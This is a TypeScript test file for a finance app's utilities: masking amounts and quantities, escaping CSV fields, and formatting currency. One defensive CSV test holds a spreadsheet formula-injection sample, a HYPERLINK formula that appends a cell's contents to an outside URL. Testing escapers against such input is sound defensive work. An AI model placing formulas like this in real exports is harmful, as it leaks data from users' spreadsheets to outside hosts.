import { describe, it, expect } from "bun:test";
import { escapeCsvField, fmtCurrency, formatMoney, maskFinancialValues, numberFormat } from "./utils";

describe("maskFinancialValues", () => {
  it("masks transaction quantities in the prompt line format", () => {
    const prompt = [
      "=== RECENT TRANSACTIONS (newest first) ===",
      "- 2026-09-25 [BUY] 6 NVDA",
      "- 2026-09-12 [BUY] 0.008 BTC-USD",
      "- 2026-09-01 [SELL] 1,200 VWCE.DE",
      "- 2026-08-20 [CUSTOMER_INBOUND] 2.5e-7 ETH-EUR",
      "- 2026-08-15 [DIVIDEND] AAPL",
    ].join("\n");
    expect(maskFinancialValues(prompt)).toBe(
      [
        "=== RECENT TRANSACTIONS (newest first) ===",
        "- 2026-09-25 [BUY] •••• NVDA",
        "- 2026-09-12 [BUY] •••• BTC-USD",
        "- 2026-09-01 [SELL] •••• VWCE.DE",
        "- 2026-08-20 [CUSTOMER_INBOUND] •••• ETH-EUR",
        "- 2026-08-15 [DIVIDEND] AAPL",
      ].join("\n"),
    );
  });

  it("masks share and unit counts in free text", () => {
    expect(maskFinancialValues("You bought 6 shares of NVDA and 0.5 units of VWCE.")).toBe(
      "You bought •••• shares of NVDA and •••• units of VWCE.",
    );
  });

  it("keeps percentages, dates, symbols and indicators", () => {
    const ledger = [
      "- **BTC-USD** (Bitcoin USD, Type: Crypto):",
      "  - Portfolio Weight: 12.50%",
      "  - Day Change: +1.20% | Total Return: -3.40%",
      "  - Technical Indicators: RSI(14): 55.2, SMA50: 61234.50, SMA200: 58000.00",
      "Week 2026-W36 from 2026-08-31",
    ].join("\n");
    expect(maskFinancialValues(ledger)).toBe(ledger);
  });

  it("keeps the existing amount masking", () => {
    expect(maskFinancialValues("Cash is $1,234.56 and EUR 50,000")).toBe("Cash is $•••• and EUR ••••");
    expect(maskFinancialValues("Bought @ 150.25")).toBe("Bought @ ••••");
    expect(maskFinancialValues("Valuation EUR1800 today")).toBe("Valuation EUR •••• today");
  });

  it("does not treat a code inside a symbol as a currency or join lines", () => {
    expect(maskFinancialValues("BTC-USD 12.5%")).toBe("BTC-USD 12.5%");
    expect(maskFinancialValues("RSI 45\nUSD exposure")).toBe("RSI 45\nUSD exposure");
  });

  it("masks amounts written with a decimal comma in full", () => {
    expect(maskFinancialValues("1.234,56 € on deposit")).toBe("•••• € on deposit");
    expect(maskFinancialValues("Gain of 3.200,50 EUR this week")).toBe("Gain of •••• EUR this week");
    expect(maskFinancialValues("Total 1,234.56 € and 2,000.50 USD, -500 $")).toBe("Total •••• € and •••• USD, -•••• $");
    expect(maskFinancialValues("€1.234,56 cash, EUR 1.234,56 cash")).toBe("€•••• cash, EUR •••• cash");
    expect(maskFinancialValues("Fr 1.234,50 and @ € 1.234,56")).toBe("Fr •••• and @ €••••");
    expect(maskFinancialValues("balance of 1.234,56")).toBe("balance ••••");
    expect(maskFinancialValues("portfolio value is: -1.234,56")).toBe("portfolio value -••••");
  });

  it("keeps the spacing rules of prices and labelled amounts", () => {
    expect(maskFinancialValues("@ $ 150 and @ USD 99")).toBe("@ $•••• and @ USD ••••");
    expect(maskFinancialValues("valuation   =   500")).toBe("valuation ••••");
    expect(maskFinancialValues("EUR : 1,800")).toBe("EUR: ••••");
  });

  it("stays linear on long runs of digits, separators and spaces", () => {
    const started = performance.now();
    maskFinancialValues("1".repeat(50_000));
    maskFinancialValues(Array.from({ length: 25_000 }, () => "1").join(","));
    for (const prefix of ["", "+", "$", "EUR", "Fr", "@", "valuation", "balance of"]) {
      maskFinancialValues(`${prefix}${" ".repeat(50_000)}x`);
    }
    // Before, 500 spaces after "valuation" alone took seconds; all of these now take milliseconds.
    expect(performance.now() - started).toBeLessThan(1000);
  });
});

describe("escapeCsvField", () => {
  it("quotes separators, quotes and line breaks", () => {
    expect(escapeCsvField("Apple")).toBe("Apple");
    expect(escapeCsvField("Apple, Inc.")).toBe('"Apple, Inc."');
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""');
    expect(escapeCsvField("line\nbreak")).toBe('"line\nbreak"');
    expect(escapeCsvField(undefined)).toBe("");
    expect(escapeCsvField(null)).toBe("");
  });

  it("keeps text that a spreadsheet would run as a formula as text", () => {
    expect(escapeCsvField('=HYPERLINK("https://example.com/?"&J2,"Apple")')).toBe(`"'=HYPERLINK(""https://example.com/?""&J2,""Apple"")"`);
    expect(escapeCsvField("+1")).toBe("'+1");
    expect(escapeCsvField("-cmd")).toBe("'-cmd");
    expect(escapeCsvField("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(escapeCsvField("\tx")).toBe("'\tx");
    expect(escapeCsvField("\rx")).toBe(`"'\rx"`);
  });

  it("leaves numbers untouched, negative amounts included", () => {
    expect(escapeCsvField(-5)).toBe("-5");
    expect(escapeCsvField(12.5)).toBe("12.5");
    expect(escapeCsvField(0)).toBe("0");
  });
});

describe("number formatting", () => {
  it("reuses one formatter per locale and digit range", () => {
    expect(numberFormat("en-US", 2, 2)).toBe(numberFormat("en-US", 2, 2));
    expect(numberFormat("en-US", 0, 4)).not.toBe(numberFormat("en-US", 2, 2));
  });

  it("formats like toLocaleString did", () => {
    expect(fmtCurrency(1234.5, "USD")).toBe("$1,234.50");
    expect(fmtCurrency(-9876543.219, "EUR")).toBe("€-9,876,543.22");
    expect(fmtCurrency(1234.5, "GBP", true)).toBe("£••••");
    expect(formatMoney(0.123456, "CHF", 6)).toBe("Fr 0.123456");
    expect(formatMoney(12, "USD", 0)).toBe("$12");
    expect(numberFormat("en-US", 0, 4).format(1234.56789)).toBe((1234.56789).toLocaleString("en-US", { maximumFractionDigits: 4 }));
  });
});
